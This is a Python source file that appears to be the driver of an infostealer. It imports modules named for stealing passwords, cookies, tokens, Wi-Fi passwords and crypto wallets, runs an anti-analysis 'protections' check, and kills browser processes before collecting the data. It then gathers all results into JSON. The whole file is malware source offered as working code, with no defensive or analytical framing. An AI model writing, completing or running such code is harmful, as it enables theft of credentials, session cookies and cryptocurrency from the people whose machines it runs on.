import os
import sys
import json

base_path = os.path.dirname(os.path.abspath(__file__))
for folder in ["Raw", "Extra"]:
    p = os.path.join(base_path, folder)
    if os.path.exists(p): sys.path.insert(0, p)

try:
    # pyrefly: ignore [missing-import]
    from protections import exit_if_protected
    exit_if_protected()
except:
    pass

try:
    # pyrefly: ignore [missing-import]
    from password_stealer import get_passwords
    # pyrefly: ignore [missing-import]
    from cookie_stealer import get_cookies
    # pyrefly: ignore [missing-import]
    from token_stealer import get_tokens
    # pyrefly: ignore [missing-import]
    from wifi_stealer import get_wifi_passwords 
    # pyrefly: ignore [missing-import]
    from wallet_stealer import get_wallets
    # pyrefly: ignore [missing-import]
    from system_info import get_system_report   
    # pyrefly: ignore [missing-import]
    from utils import kill_browser_processes    
except ImportError as e:
    print(f"Error: {e}")

def run_all_stealers():
    results = {}
    
    try:
        kill_browser_processes()
        import time
        time.sleep(1)
    except:
        pass
    
    try:
        results["passwords"] = get_passwords()
    except: pass

    try:
        results["cookies"] = get_cookies()
    except: pass

    try:
        results["tokens"] = get_tokens()
    except: pass

    try:
        results["wifi"] = get_wifi_passwords()
    except: pass

    try:
        results["wallets"] = get_wallets()
    except: pass
    
    return results

if __name__ == "__main__":
    data = run_all_stealers()
    print(json.dumps(data, indent=2))